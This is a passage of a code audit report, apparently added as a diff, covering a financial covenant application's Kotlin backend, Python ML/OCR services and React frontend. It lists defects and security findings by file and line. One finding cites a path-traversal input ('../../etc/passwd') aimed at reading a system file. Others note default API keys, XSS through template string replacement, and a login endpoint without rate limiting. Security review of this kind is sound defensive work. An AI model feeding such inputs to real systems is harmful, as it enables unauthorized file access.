+| 4.3 | MEDIUM | Content Security | Inline styles block strict CSP |
+| 5.2 | MEDIUM | Input Validation | Customer form lacks validation |
+| 5.3 | MEDIUM | Input Validation | Admin user form lacks email validation |
+| 6.1 | MEDIUM | Dependencies | Deprecated sockjs-client |
+| 7.1 | MEDIUM | API Security | Middleware checks token presence, not validity |
+| 5.4 | LOW | Input Validation | Route params lack format validation |
+| 6.2 | LOW | Dependencies | No npm audit in workflow |
+| 6.3 | LOW | Dependencies | Dual build system (Vite + Next.js) |
+| 7.2 | LOW | Content Security | Ungated console logging in WS/PDF modules |
+| 7.3 | LOW | Content Security | NEXT_PUBLIC_ vars embedded in client bundle |
+BACKEND (Kotlin) FINDINGS
+1. Missing Null Safety / NPE Risks
+#	File	Line(s)	Issue
+1	backend/.../covenant/application/WaiverService.kt	72-74	item.covenant.covenantCustomer.customer.name — chained nullable property access. If any JPA relationship is null (or lazy-loaded in wrong context), this NPEs.
+2	backend/.../covenant/application/WaiverService.kt	114	letter.monitoringItem — no null check; if the entity relationship is null, this NPEs.
+3	backend/.../workflow/application/WorkflowService.kt	122	instance.definition!! — force unwrap of nullable. If JPA lazy-loading fails in wrong context, NPE.
+4	backend/.../workflow/application/WorkflowService.kt	200	instance.tasks.add(saved) — direct modification of a potentially-uninitialized JPA lazy collection.
+5	backend/.../document/infrastructure/MlServiceClient.kt	63,88,133,160,249,310,395	.block()!! — double null-assertion on blocking Mono. If the remote service returns empty, this throws NPE instead of a meaningful error.
+6	backend/.../shared/security/TenantContext.kt	4-10	Uses ThreadLocal<String> which leaks tenant context between requests when using virtual threads or async dispatchers.
+7	backend/.../shared/security/JwtTokenProvider.kt	64-65	Sets TenantContext.set(tenantId) from JWT claims but never clears it, causing potential tenant context leakage.
+8	backend/.../covenant/application/CovenantMonitoringService.kt	306	id!! force-unwrap in toResponse() across all entity-to-DTO mappings.
+2. Improper Exception Handling
+#	File	Line(s)	Issue
+1	backend/.../covenant/application/WaiverService.kt	117-129	Email loop catches Exception broadly. Only logs message, not stack trace. Partial success state (some emails sent, some failed) is not clearly communicated.
+2	backend/.../integration/application/IntegrationSyncService.kt	77-79	catch (ex: Exception) in pushSpread — stores only ex.message, discarding the stack trace and exception type.
+3	backend/.../integration/application/IntegrationSyncService.kt	122-126	catch (ex: Exception) in retryFailedSyncs — overly broad. Should distinguish connection errors from data errors.
+4	backend/.../document/application/DocumentProcessingService.kt	198-202	getOrElse handler catches ALL exceptions (including programming errors like NullPointerException), marks document as ERROR, and swallows the exception.
+5	backend/.../covenant/application/SpreadCovenantEventListener.kt	81-83	catch (e: Exception) — only logs e.message, not the full stack trace. Should use log.error("...", covenant.name, e).
+6	backend/.../document/infrastructure/MlServiceClient.kt	398-425	executeWithResilience catches all exceptions and rethrows, but wraps in IllegalStateException which loses the original error category.
+3. Missing Transaction Boundaries
+#	File	Line(s)	Issue
+1	backend/.../document/application/DocumentProcessingService.kt	52-80	list() method missing @Transactional(readOnly = true).
+2	backend/.../document/application/DocumentProcessingService.kt	205-209	getDocument() and getStatus() missing @Transactional(readOnly = true).
+3	backend/.../covenant/application/CovenantMonitoringService.kt	47-60	Query methods listByTenant(), listByCovenant(), listPending(), listBreached(), get() all missing @Transactional(readOnly = true).
+4	backend/.../integration/application/IntegrationSyncService.kt	198-199	listSyncRecords() missing @Transactional(readOnly = true).
+5	backend/.../covenant/application/CovenantService.kt	41-42	listCovenantCustomers() and getCovenantCustomer() missing @Transactional(readOnly = true).
+4. N+1 Query Problems
+#	File	Line(s)	Issue
+1	backend/.../covenant/application/CovenantMonitoringService.kt	48,309	findByTenantId() returns items; toResponse() then accesses item.covenant.covenantCustomer.customer.name, triggering N+1 lazy loads per item.
+2	backend/.../covenant/application/CovenantMonitoringService.kt	323	documents.size in toResponse() triggers a separate query per monitoring item to load the documents collection.
+3	backend/.../covenant/application/CovenantService.kt	110	findByCovenantCustomerIdAndIsActiveTrue() + toResponse() accessing covenant.covenantCustomer.customer.name is N+1.
+4	backend/.../covenant/application/SpreadCovenantEventListener.kt	64,70	Loops through covenants, calling monitoringRepository.findByCovenantId() then monitoringRepository.save(item) per item — N+1 reads + N+1 writes.
+5	backend/.../workflow/application/WorkflowEscalationScheduler.kt	28-63	For each overdue task, accesses task.instance, instance.definition, definition.steps — classic N+1.
+6	backend/.../workflow/application/WorkflowService.kt	148-158	getPendingTasks() filters in-memory with it.instance?.tenantId == tenantId, loading all tasks across all tenants first. Should be a DB query.
+5. Thread Safety Issues
+#	File	Line(s)	Issue
+1	backend/.../document/infrastructure/MlServiceClient.kt	26-31	ConcurrentHashMap<String, CircuitState> with CircuitState having mutable fields. While synchronized(state) blocks exist, mixing ConcurrentHashMap with synchronized is an anti-pattern. Should use a single synchronization approach.
+2	backend/.../shared/security/TenantContext.kt	4-10	ThreadLocal<String> is not safe with virtual threads (Java 21+) since ThreadLocal values are not inherited. Should use ScopedValue or a request-scoped bean.
+6. Missing Validation Annotations on Request DTOs
+#	File	Line(s)	Issue
+1	backend/.../covenant/dto/CovenantRequest.kt	1-26	No @NotNull on covenantCustomerId, no @NotBlank on name, covenantType, frequency. No validation on operator enum values.
+2	backend/.../covenant/dto/WaiverGenerationRequest.kt	1-13	No @NotBlank on waiverType. No validation that it's "INSTANCE" or "PERMANENT".
+3	backend/.../covenant/dto/WaiverRequest.kt	1-13	No @NotBlank on waiverType, letterType, deliveryMethod. No enum validation.
+4	backend/.../covenant/dto/ManualValueRequest.kt	1-8	No @NotNull on value, no @NotBlank on justification.
+5	backend/.../covenant/dto/CovenantCustomerRequest.kt	1-18	No @NotNull on customerId. No @NotBlank/@Email on contact email and name.
+6	backend/.../covenant/dto/EmailTemplateRequest.kt	1-11	No @NotBlank on name and bodyHtml.
+7	backend/.../covenant/dto/CheckerDecisionRequest.kt	9-11	No @NotBlank on decision. No validation that it's "APPROVE" or "REJECT".
+8	backend/.../covenant/api/CovenantController.kt	69	No @Valid on @RequestBody request: CovenantRequest — even if DTOs had validation, they wouldn't be enforced. Same for all controller methods.
+9	backend/.../covenant/api/WaiverController.kt	37	No @Valid on @RequestBody request: WaiverRequest.
+10	backend/.../covenant/api/CovenantMonitoringController.kt	70	No @Valid on @RequestBody request: ManualValueRequest.
+7. Code Duplication
+#	File	Line(s)	Issue
+1	backend/.../covenant/application/WaiverService.kt	51-103, 167-215	generateWaiverLetter() and processWaiver() share near-identical template lookup, letter building, and audit logging logic.
+2	backend/.../integration/application/IntegrationSyncService.kt	62-80, 100-127, 150-166	pushSpread(), retryFailedSyncs(), and retrySingle() all share retry/adapter-call/save-failure pattern.
+3	Multiple services	—	resolvedTenantId() pattern duplicated in WaiverService, CovenantMonitoringService, CovenantService, SpreadService. Should be a shared utility.
+4	backend/.../document/infrastructure/MlServiceClient.kt	52-64, 82-89, 127-134	Every method repeats the executeWithResilience { client.post().uri(...).bodyValue(...).retrieve().bodyToMono(...).withMlResilience(...).block()!! } pattern.
+8. Missing or Incorrect Logging
+#	File	Line(s)	Issue
+1	backend/.../auth/application/AuthService.kt	46	"Invalid credentials" should not be logged at info level for security — enables brute-force enumeration.
+2	backend/.../covenant/application/WaiverService.kt	269	log.warn("PDF generation not yet implemented") — returns HTML bytes instead of PDF. This should be log.error() since it returns incorrect content type.
+3	backend/.../covenant/application/SpreadCovenantEventListener.kt	82	Only logs e.message, not the exception object. Should be log.error("...", covenant.name, e).
+4	backend/.../document/application/DocumentProcessingService.kt	140-202	No progress logging during document processing pipeline steps (OCR, table detection, zone classification).
+5	backend/.../workflow/application/WorkflowEscalationScheduler.kt	59	No logging when a task is timed out (no escalation configured). Should log at WARN level.
+9. Improper Use of Spring Components
+#	File	Line(s)	Issue
+1	backend/.../integration/application/SyncRetryScheduler.kt	18	TenantContext.get() called in a @Scheduled task. ThreadLocal is empty in scheduler threads, so feature flag always uses default.
+2	backend/.../workflow/application/WorkflowEscalationScheduler.kt	24	Same TenantContext.get() issue in @Scheduled task.
+3	backend/.../covenant/application/SpreadCovenantEventListener.kt	33-35	@Async @EventListener @Transactional — combining @Async with @Transactional risks LazyInitializationException if the event publisher passes a detached entity. The @Transactional opens a new transaction but the event payload may reference detached entities.
+10. Missing Error Codes in API Responses
+#	File	Line(s)	Issue
+1	backend/.../workflow/application/WorkflowService.kt	43	Uses IllegalArgumentException instead of ApiException(ErrorCode.NOT_FOUND, ...). Results in 500 instead of 404.
+2	backend/.../workflow/application/WorkflowService.kt	99,165	Uses require() which throws IllegalArgumentException, bypassing structured error responses.
+3	backend/.../shared/exception/ErrorCode.kt	1-13	Missing domain-specific error codes like DUPLICATE_ENTITY, SYNC_IN_PROGRESS, WORKFLOW_INVALID_STATE, etc.
+4	backend/.../covenant/api/CovenantMonitoringController.kt	30-39	summary() returns Map<String, Any> with inconsistent key casing ("breached" lowercase vs enum BREACHED).
+ML/OCR SERVICE (Python) FINDINGS
+1. Missing Type Hints
+#	File	Line(s)	Issue
+1	ml-service/app/services/feedback_store.py	21-22	_memory_store and _pg_available lack type hints. _pool has no type hint.
+2	ml-service/app/services/feedback_store.py	34	save_corrections parameter corrections: list[dict] — dict should be dict[str, Any].
+3	ml-service/app/ml/zone_classifier.py	102	classify_by_keywords has no return type annotation. Should be tuple[ZoneType, float].
+4	ml-service/app/ml/covenant_predictor.py	100-137	_normalize_history, _extract_period, _extract_numeric lack complete type hints.
+5	ocr-service/app/api/ocr.py	313-335	_build_preprocess_options and _resolve_language lack return type hints.
+6	ocr-service/app/ml/vlm_processor.py	107-113	extract_page return type dict should be dict[str, Any].
+7	ml-service/app/services/model_manager.py	35-46	load_model return type Path but can raise FileNotFoundError — no raises documentation.
+2. Improper Async Patterns (Blocking Calls in Async Functions)
+#	File	Line(s)	Issue
+1	ml-service/app/api/pipeline.py	43	async def process_document performs synchronous CPU-bound work (zone classification, mapping) at lines 160-277, blocking the event loop. Should use asyncio.to_thread() or run_in_executor().
+2	ml-service/app/api/zones.py	25	async def classify_zones calls synchronous zone_classifier.classify() and classify_by_keywords(), blocking the event loop.
+3	ml-service/app/api/mapping.py	21	async def suggest_mapping calls synchronous matcher.match(), a CPU-intensive embedding + cosine similarity operation, blocking the event loop.
+4	ocr-service/app/api/ocr.py	66	async def extract_text calls synchronous preprocess_image(), extract_native_text(), pdf_to_images(), and VLM/PaddleOCR inference — all CPU/GPU-bound blocking calls.
+5	ocr-service/app/ml/paddle_ocr.py	45	extract_page() is synchronous but called from async context. PaddleOCR inference blocks the event loop.
+6	ml-service/app/api/anomaly_detection.py	52,75	detect_anomalies and detect_anomalies_batch are async def but call synchronous _detector.detect().
+7	ml-service/app/services/feedback_store.py	47-76	_save_to_pg() does row-by-row inserts in an async with block but doesn't batch them. Should use conn.executemany().
+3. Missing Error Handling (Bare Except, Swallowed Exceptions)
+#	File	Line(s)	Issue
+1	ml-service/app/api/pipeline.py	103,133	except Exception catches all exceptions during table parsing and zone classification, swallowing specific error context.
+2	ml-service/app/services/feedback_store.py	77	except Exception: in _save_to_pg() silently falls back to memory, hiding PostgreSQL connectivity issues.
+3	ml-service/app/services/feedback_store.py	133	except Exception: in _export_from_pg() returns empty list on error, silently losing data.
+4	ml-service/app/services/feedback_store.py	191	except Exception: in _stats_from_pg() returns empty stats dict, hiding errors.
+5	ml-service/app/services/database.py	42	except Exception in init_pool() only logs a warning, making the service silently degrade without clear operational visibility.
+6	ml-service/app/ml/semantic_matcher.py	113	except Exception: in load_taxonomy() sets self._taxonomy = {}, silently degrading matching quality with no user-visible error.
+7	ml-service/app/ml/zone_classifier.py	258	except Exception: in _infer() catches all and falls back to heuristic without logging the specific error.
+8	ocr-service/app/api/ocr.py	88	except Exception as exc: in file download catches all exceptions with a generic 502 error.
+9	ml-service/app/main.py	123-131	Global exception handler leaks str(exc) in debug mode — potential security risk exposing internal details.
+4. Global Mutable State
+#	File	Line(s)	Issue
+1	ml-service/app/services/database.py	18	_pool = None — module-level mutable global. Not thread-safe in multi-worker deployments.
+2	ocr-service/app/ml/paddle_ocr.py	19	_instances: dict[str, "PaddleOCREngine"] = {} — class-level mutable singleton dict without thread lock.
+3	ml-service/app/ml/semantic_matcher.py	51	_target_cache: dict[str, tuple[np.ndarray, list[int]]] = {} — unbounded cache with no eviction policy. Can grow indefinitely.
+4	ml-service/app/api/anomaly_detection.py	17	_detector = AnomalyDetector() — module-level mutable singleton.
+5	ocr-service/app/ml/vlm_processor.py	54-56	self.model, self.processor, self.is_loaded are mutable attributes on a singleton. Under concurrent async requests, race conditions possible during inference.
+5. Missing Input Validation on API Endpoints
+#	File	Line(s)	Issue
+1	ml-service/app/api/pipeline.py	43	PipelineRequest has no validation for storage_path (could contain path traversal like ../../etc/passwd). No min_length=1 on document_id.
+2	ml-service/app/api/zones.py	25	No validation that request.tables is non-empty. Empty list produces empty results silently.
+3	ml-service/app/api/mapping.py	21	No validation that source_rows or target_items are non-empty.
+4	ml-service/app/api/anomaly_detection.py	29	AnomalyDetectionRequest.spread_values has no min_length=1 constraint.
+5	ocr-service/app/api/ocr.py	28-34	OcrRequest.document_id and storage_path have no min_length or format validation. language defaults to "en" but no validation against supported_language_list before reaching _resolve_language.
+6	ml-service/app/config.py	14	api_key: str = "changeme-ml-api-key" — insecure default that could be used in production.
+7	ocr-service/app/config.py	13	api_key: str = "changeme-ocr-api-key" — same security concern.
+6. Resource Leaks
+#	File	Line(s)	Issue
+1	ml-service/app/api/pipeline.py	70	httpx.AsyncClient(timeout=timeout) created per request inside async with. Creates a new connection pool for every request. Should be a shared client on app.state.
+2	ml-service/app/services/feedback_store.py	50-75	Individual conn.execute() calls in a loop rather than conn.executemany(). Inefficient for large batches.
+3	ocr-service/app/services/storage_client.py	64-66	S3 get_object response body is not explicitly closed. For large files, this holds connections.
+4	ml-service/app/ml/vlm_processor.py	228-268	_generate() allocates GPU tensors but doesn't explicitly free them. Under sustained load, this can exhaust GPU memory.
+7. Improper Use of Decimal vs Float for Financial Calculations
+#	File	Line(s)	Issue
+1	ml-service/app/ml/covenant_predictor.py	37-98	Uses Python float for all breach probability calculations, confidence intervals, and forecast values. Financial covenant thresholds should use Decimal for precision.
+2	ml-service/app/ml/covenant_predictor.py	83-84	round(expected_value, 4) and round(breach_risk, 4) use float rounding, introducing precision errors.
+3	ml-service/app/ml/semantic_matcher.py	188	confidence=round(score, 4) uses float for confidence scoring that feeds into covenant mapping decisions.
+4	backend/.../document/infrastructure/MlServiceClient.kt	141,170	confidence: Float in data classes — should be BigDecimal or at minimum Double for financial accuracy.
+FRONTEND (React/TypeScript) FINDINGS
+1. Missing Error Boundaries
+#	File	Line(s)	Issue
+1	numera-ui/src/components/ui/ErrorBoundary.tsx	1-29	ErrorBoundary has no componentDidCatch for error logging. No retry/reset mechanism. No way to recover without full page refresh.
+2	numera-ui/src/app/(dashboard)/covenants/page.tsx	—	Page not wrapped in ErrorBoundary. Render errors crash the entire page.
+3	numera-ui/src/app/spreading/[spreadId]/page.tsx	—	Complex page with many interactive elements, not wrapped in ErrorBoundary.
+4	numera-ui/src/app/(dashboard)/dashboard/page.tsx	—	Dashboard with chart components, not wrapped in ErrorBoundary.
+5	numera-ui/src/components/spreading/PdfViewer.tsx	—	PDF rendering component has no ErrorBoundary. PDF parsing errors crash the parent.
+2. Memory Leaks (Missing Cleanup in useEffect)
+#	File	Line(s)	Issue
+1	numera-ui/src/components/spreading/PdfViewer.tsx	37-58	PDF document loaded via pdfjsLib.getDocument() but the loading task is never cancelled on unmount. Should call loadingTask.destroy() in cleanup.
+2	numera-ui/src/components/spreading/PdfViewer.tsx	62-90	page.render() returns a RenderTask that is not cancelled on unmount or re-render. Should store task reference and call .cancel() in cleanup.
+3	numera-ui/src/app/spreading/[spreadId]/page.tsx	110-113	Heartbeat setInterval doesn't cancel in-flight mutateAsync on unmount. If component unmounts during mutation, it can cause state update on unmounted component.
+4	numera-ui/src/hooks/useWebSocket.ts	15-22	useWebSocketConnection calls wsClient.connect() on every token or tenantId change. The singleton wsClient means disconnect() disconnects for ALL consumers, not just this component's subscription.
+3. Improper State Management
+#	File	Line(s)	Issue
+1	numera-ui/src/stores/authStore.ts	23-28	setToken() writes to both localStorage (via Zustand persist) and document.cookie, creating dual state. Cookie and localStorage can diverge, causing auth inconsistencies.
+2	numera-ui/src/services/api.ts	9-22	getAuthSnapshot() reads directly from localStorage instead of using the Zustand store, creating a second source of truth for auth state.
+3	numera-ui/src/services/api.ts	25-51	tryRefresh() directly manipulates localStorage JSON, bypassing Zustand store. This can create inconsistency between the React state and persisted state.
+4	numera-ui/src/stores/spreadStore.ts	—	Store doesn't reset on component unmount. activeSpread from a previous session could persist and cause stale data.
+5	numera-ui/src/app/(dashboard)/covenants/page.tsx	26-28	Two useWebSocketSubscription calls with inline callback functions. Even with handlerRef, the dependency on destination triggers resubscriptions on every render if the value isn't memoized.
+4. Missing Loading/Error States
+#	File	Line(s)	Issue
+1	numera-ui/src/app/(dashboard)/covenants/page.tsx	22-24	Casts query data with as Array<...> without null checks. If query fails, this causes runtime errors. No loading state for definitionsQuery.
+2	numera-ui/src/app/(dashboard)/covenants/page.tsx	—	No loading indicator when customersQuery.isLoading or monitoringQuery.isLoading. Shows empty content instead of skeletons.
+3	numera-ui/src/app/spreading/[spreadId]/page.tsx	172-178	Only handles spreadQuery.isLoading. Other queries (valuesQuery, lockQuery, historyQuery) have no loading states.
+4	numera-ui/src/app/spreading/[spreadId]/page.tsx	—	No error state handling for failed queries. If valuesQuery fails, user sees an empty table with no error message.
+5	numera-ui/src/components/spreading/PdfViewer.tsx	47-49	catch (error) only logs to console. No error state displayed to the user.
+6	numera-ui/src/app/(dashboard)/dashboard/page.tsx	31-38	Error state only shows generic "Failed to load dashboard" message. No retry button or specific error details.
+5. Accessibility Issues
+#	File	Line(s)	Issue
+1	numera-ui/src/app/(dashboard)/covenants/page.tsx	65	<select> element has no <label> or aria-label for screen readers.
+2	numera-ui/src/app/(dashboard)/covenants/page.tsx	93	<button> with icon <Send> lacks aria-label describing the action.
+3	numera-ui/src/app/spreading/[spreadId]/page.tsx	—	Multiple <button> elements throughout (lines 231-258) have text but no aria-describedby for complex actions.
+4	numera-ui/src/components/spreading/PdfViewer.tsx	117-164	Navigation buttons lack aria-label attributes. Zoom and page controls are not accessible.
+5	numera-ui/src/app/(dashboard)/dashboard/page.tsx	102-109	Recharts components have no aria-label or accessible descriptions.
+6	numera-ui/src/app/(dashboard)/covenants/page.tsx	105-127	Data table lacks role="table" and <th scope> attributes for accessibility.
+6. Performance Issues
+#	File	Line(s)	Issue
+1	numera-ui/src/hooks/useWebSocket.ts	15-22	useWebSocketConnection reconnects on every token change, even if the value is the same. Should compare previous token value.
+2	ml-service/app/ml/semantic_matcher.py	51,206-225	_target_cache has no LRU eviction or size limit. With many distinct template sets, this grows unbounded.
+3	numera-ui/src/app/(dashboard)/covenants/page.tsx	30	useMemo for breached items filters on every render even though monitoring rarely changes. The filter is lightweight but the pattern is repeated.
+4	numera-ui/src/app/spreading/[spreadId]/page.tsx	98-107	categories useMemo iterates all values on every render. Should be derived once from the query data.
+5	numera-ui/src/services/api.ts	25-51	tryRefresh() parses and stringifies localStorage JSON on every 401, creating GC pressure. Should use the Zustand store directly.
+6	numera-ui/src/components/spreading/PdfViewer.tsx	62-90	Canvas render effect has currentScale in dependency array but re-renders the entire page on scale change. Should debounce or use requestAnimationFrame.
+CROSS-CUTTING CONCERNS
+Security
+#	Service	File	Line(s)	Issue
+1	ML	ml-service/app/config.py	14	Default API key "changeme-ml-api-key" should be enforced as non-default in production.
+2	OCR	ocr-service/app/config.py	13	Default API key "changeme-ocr-api-key" same concern.
+3	ML	ml-service/app/main.py	123-131	Global exception handler leaks str(exc) in debug mode.
+4	Backend	backend/.../shared/security/JwtTokenProvider.kt	64-65	Sets TenantContext from JWT but never clears it, enabling tenant context leakage.
+5	Backend	backend/.../covenant/application/WaiverService.kt	276-279	HTML template building with string replacement (templateHtml.replace(...)) is vulnerable to XSS if covenantName, customerName, etc. contain HTML. Should use HTML escaping.
+API Design
+#	Service	File	Line(s)	Issue
+1	Backend	backend/.../covenant/api/WaiverController.kt	60-64	@RequestParam recipients: List<String> — passing emails as query parameters is a security concern (logged in URL) and won't work for large lists. Should be @RequestBody.
+2	Backend	backend/.../covenant/api/CovenantMonitoringController.kt	99-101	/sweep-overdue as a POST endpoint but has no authentication/authorization check — any authenticated user can trigger the sweep.
+3	Backend	backend/.../covenant/api/CovenantMonitoringController.kt	30-39	summary() returns Map<String, Any> — should return a typed DTO for API stability.
+4	Backend	backend/.../auth/api/AuthController.kt	—	(Referenced by AuthService) Login endpoint doesn't have rate limiting, allowing brute-force attacks.
+This audit covers 7 critical null safety issues, 6 improperly handled exceptions, 5 missing transaction boundaries, 6 N+1 query problems, 2 thread safety issues, 10 missing validation points, 4 code duplication hotspots, 5 logging deficiencies, 3 Spring component misuse issues, 4 missing error code patterns, 7 blocking-async issues, 9 swallowed exceptions, 5 global mutable state concerns, 7 input validation gaps, 4 resource leak patterns, 4 Decimal/float precision issues, 5 missing error boundaries, 4 memory leak risks, 5 state management inconsistencies, 6 missing loading/error states, 6 accessibility violations, and 6 performance concerns.
